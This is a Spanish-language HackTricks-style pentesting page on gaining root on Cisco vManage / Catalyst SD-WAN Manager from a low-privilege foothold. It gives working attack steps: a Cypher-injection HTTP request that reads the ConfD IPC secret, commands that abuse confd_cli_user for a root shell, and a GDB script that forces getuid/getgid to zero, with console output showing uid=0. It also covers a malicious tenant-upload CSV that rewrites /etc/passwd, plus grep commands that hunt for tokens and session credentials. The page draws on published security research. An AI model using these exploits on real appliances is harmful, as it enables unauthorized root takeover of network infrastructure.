# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una vez que obtengas code execution en Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` o `vmanage-admin`, las superficies locales de privesc más interesantes suelen ser el stack de CLI de `confd`, el helper `cmdptywrapper`, las REST APIs de localhost y los handlers de importación/subida propiedad de root.

Si todavía necesitas el **initial foothold** en un controller, consulta primero la página dedicada al control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triaje local rápido
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Si `/etc/confd/confd_ipc_secret` se puede leer desde tu punto de apoyo, la Ruta 1 y la Ruta 2 se vuelven inmediatamente viables. Si llegas mediante una divulgación remota de archivos o un webshell, inspecciona también el material SSH de `vmanage-admin` y los manejadores de carga de multitenancy; investigaciones recientes demostraron que ambos son pivotes viables.<sup>[[3]](#references)[[4]](#references)</sup>

## Ruta 1

La evaluación de vManage de Synacktiv documenta este método para obtener un root shell.<sup>[[5]](#references)</sup>

La [documentación de ConfD](http://66.218.245.39/doc/html/rn03re18.html) enlazada en el informe describe la autenticación IPC; su ejemplo de vManage coloca el secreto en `/etc/confd/confd_ipc_secret` y muestra que `vmanage` puede leerlo.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Dado que Neo4j se ejecuta con privilegios de `vmanage` en la configuración reportada, la inyección de Cypher anterior puede leer el archivo secreto.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` por sí mismo no acepta argumentos de línea de comandos; invoca `/usr/bin/confd_cli_user`. El workflow reportado extrae ese helper legible por root desde el rootfs, lo copia mediante `scp`, lee su ayuda, establece `CONFD_IPC_ACCESS_FILE` y lo ejecuta con `-U 0 -G 0` para obtener un shell de root.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Ruta 2

Esta ruta alternativa está adaptada de la investigación de Walmart Global Tech sobre vManage 19.2.2.<sup>[[6]](#references)</sup>

La ruta de Synacktiv necesita una copia de `/usr/bin/confd_cli_user`, que puede ser leída por root en la configuración reportada; el informe de Walmart, en cambio, modifica los valores de identidad de `confd_cli` mediante GDB.<sup>[[5]](#references)[[6]](#references)</sup>

El desensamblado del informe muestra que `confd_cli` recopila el UID y el GID del invocador.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump que muestra la recopilación de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

La misma prueba mostró un `cmdptywrapper` propiedad de root que recibía valores explícitos `-g` y `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
El investigador dedujo que `confd_cli` reenvía el UID y el GID del usuario autenticado a `cmdptywrapper`.<sup>[[6]](#references)</sup>

La ejecución directa de `cmdptywrapper` con `-g 0 -u 0` falló porque el descriptor de archivo requerido (`-i 1015` en el ejemplo) no estaba disponible.<sup>[[6]](#references)</sup>

Como `confd_cli` no expone esos valores como argumentos, el informe utiliza GDB para sobrescribir los valores de retorno de `getuid()` y `getgid()`; GDB estaba presente en ese appliance.<sup>[[5]](#references)[[6]](#references)</sup>

Con acceso a `vmanage`, la prueba pudo leer `/etc/confd/confd_ipc_secret`; el siguiente script fuerza a ambas llamadas de identidad a devolver cero.<sup>[[6]](#references)</sup>

El script de GDB utilizado en el informe es:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
La salida de consola reportada es:<sup>[[6]](#references)</sup>

<details>
<summary>Salida de consola</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Ruta 3 (bug de validación de entrada de CLI de 2025 - CVE-2025-20122)

Cisco documentó posteriormente una ruta local más limpia hacia root en su propio aviso para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). Un **atacante autenticado con solo privilegios de lectura** podía enviar una solicitud manipulada al CLI del manager y obtener root debido a una validación de entrada insuficiente.<sup>[[7]](#references)</sup>

Desde una perspectiva ofensiva, este aviso y la investigación anterior sobre el CLI sugieren el siguiente flujo de trabajo.<sup>[[6]](#references)[[7]](#references)</sup>

1. Una vez que tengas *cualquier* foothold con pocos privilegios en el equipo, deberías probar el servicio CLI local antes de iniciar el flujo de trabajo más pesado de Path 1 / Path 2.
2. Reutiliza los artefactos de Path 2 para encontrar el límite de confianza: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trata como sospechoso cada campo reenviado al backend del CLI: UID/GID, nombre de usuario, metadatos del terminal, archivos importados o cualquier valor consumido posteriormente por un helper propiedad de root.
4. Si un usuario con pocos privilegios puede acceder al socket CLI local e influir en esos campos, root podría estar a solo una solicitud manipulada de distancia.

Después de obtener acceso al appliance, inspecciona la cadena del CLI local de la siguiente manera.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Esto convierte el bug de 2025 en un hunting pattern reutilizable: busca **local CLI shims que recopilen la identidad en userland y la reenvíen a un wrapper privilegiado**.<sup>[[6]](#references)[[7]](#references)</sup>

No confundas **CVE-2025-20122** con la posterior **CVE-2026-20122**: el issue de 2025 es un bug *local* de CLI a root, mientras que el issue de 2026 es un arbitrary file overwrite remoto de la API, principalmente útil para plantar un foothold y después revisar Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

El advisory de Cisco de febrero de 2026 describe otra clase útil de privesc, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). Un **atacante local autenticado con pocos privilegios** podría obtener root debido a un mecanismo insuficiente de autenticación de usuarios en la REST API.<sup>[[1]](#references)</sup>

Esto importa porque el privesc en vManage ya no se limita al abuso de `confd`/TTY; después de obtener un shell con pocos privilegios, busca también lo siguiente.<sup>[[1]](#references)</sup>

- endpoints de la API exclusivos de localhost que confíen demasiado en el caller
- tokens, cookies o service credentials legibles desde la cuenta actual
- acciones exclusivas de root expuestas mediante handlers de `dataservice`/REST que aún puedan activarse localmente

En la práctica, una vez que tengas un shell como `vmanage` u otro usuario de servicio, el abuso de la API local puede ser más fácil de automatizar que el abuso de la CLI interactiva.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si el contexto de la sesión local es suficiente para acceder a funcionalidad REST privilegiada, prefiere la ruta de la API: es más fácil de reproducir, automatizar y encadenar con sesiones web o API tokens robados.<sup>[[1]](#references)</sup>

## Ruta 5 (archivo creado en 2026 procesado por root - CVE-2026-20245)

Otro patrón reciente es [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Un atacante local con privilegios de `netadmin` podía cargar un **archivo creado** que posteriormente era manejado de forma insegura por la CLI, lo que permitía la inyección de comandos como `root`.<sup>[[2]](#references)</sup>

Desde el punto de vista de HackTricks, la técnica valiosa es más amplia que la CVE específica.<sup>[[2]](#references)</sup>

1. Enumera cada flujo de trabajo de la CLI o web que acepte un archivo: importaciones, paquetes de diagnóstico, plantillas, validadores, copias de seguridad, datos de tenants, etc.
2. Rastrea dónde termina el archivo cargado y qué script o binario propiedad de root lo consume.
3. Comprueba si el nombre del archivo, su contenido o los metadatos analizados se pasan alguna vez a comandos de shell, scripts wrapper o helpers de estilo `system()`.
4. Si ya puedes acceder a `netadmin` (credenciales válidas, sesión robada o una cadena de bypass de autenticación), los bugs de procesamiento de archivos suelen ser la ruta más rápida hacia root.

Posteriormente, Google Cloud / Mandiant mostró un caso concreto de esta clase de bug explotado mediante la ruta de importación multitenancy.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
En el ataque observado, el CSV manipulado modificó `/etc/passwd` y `/etc/shadow` para crear una cuenta temporal con UID 0 (`troot`). Esto hace que los importadores de tipo `tenant-upload` / `tenant-list` sean especialmente interesantes: no son solo funciones de ingesta de datos, sino posibles front-ends de análisis propiedad de root.<sup>[[4]](#references)</sup>

Un patrón rápido de búsqueda desde el shell es:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Esta clase de bug encadena especialmente bien con footholds remotos que conceden `netadmin`, pero no `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Otras vulnerabilidades recientes de vManage/Catalyst SD-WAN Manager para encadenar

- **Info leak no autenticado (CVE-2026-20133)** – Especialmente valioso porque una investigación pública mostró que podía exponer `confd_ipc_secret` o la clave privada de `vmanage-admin`, convirtiendo un bug de lectura en Path 1 o en un pivot de NETCONF.<sup>[[3]](#references)</sup>
- **Sobrescritura arbitraria de archivos mediante API autenticada (CVE-2026-20122)** – Diferente del bug de CLI de 2025 mencionado arriba; VulnCheck lo utilizó para cargar un webshell, lo que hace que las rutas de privesc local de esta página sean inmediatamente relevantes.<sup>[[3]](#references)</sup>
- **XSS autenticado en la UI (CVE-2024-20475)** – Un atacante autenticado puede ejecutar un script en la interfaz web de un usuario afectado; evalúa si el contexto de sesión resultante expone acciones de API/CLI que lleguen a `vshell` o a una de las rutas de privesc local mencionadas arriba.<sup>[[9]](#references)</sup>
- **Auth bypass remoto a `netadmin` (CVE-2026-20129)** – Precursor muy sólido para Path 5, porque `netadmin` es exactamente el nivel requerido por la privesc mediante archivo manipulado de 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Escritura arbitraria de archivos autenticada (CVE-2026-20262)** – Valor ofensivo similar al de CVE-2026-20122, pero a través de una ruta posterior de carga en la UI web; Cisco indica que un archivo creado o sobrescrito por el bug podría utilizarse posteriormente para elevar privilegios a root.<sup>[[10]](#references)</sup>
- **Downgrade para reactivar la privesc antigua de CLI (CVE-2022-20775)** – Las intrusiones de 2026 mostraron que los atacantes pueden volver a una build antigua y vulnerable de SD-WAN, abusar del antiguo bug de CLI para obtener root y después restaurar la versión original.<sup>[[8]](#references)</sup>
- **Auth bypass del plano de control pre-auth (CVE-2026-20182)** – Está mejor documentado en la página específica del plano de control de SD-WAN; puede añadir una clave SSH para `vmanage-admin`, proporcionando acceso NETCONF persistente para acciones posteriores en el plano de gestión.<sup>[[11]](#references)</sup>



## References

- [1] [Vulnerabilidades de Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Vulnerabilidad de escalada de privilegios autenticada en Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager y Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Vulnerabilidades recientes de Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Explotación zero-day de una vulnerabilidad (CVE-2026-20245) en Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting de Cisco SD-WAN, parte 1: atacando vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking de Cisco SD-WAN vManage 19.2.2 — De CSRF a ejecución remota de código](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Vulnerabilidad de escalada de privilegios de Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Explotación activa de Cisco Catalyst SD-WAN por UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Vulnerabilidad de Cross-Site Scripting de Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Vulnerabilidad de escritura arbitraria de archivos de Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Auth bypass crítico en Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
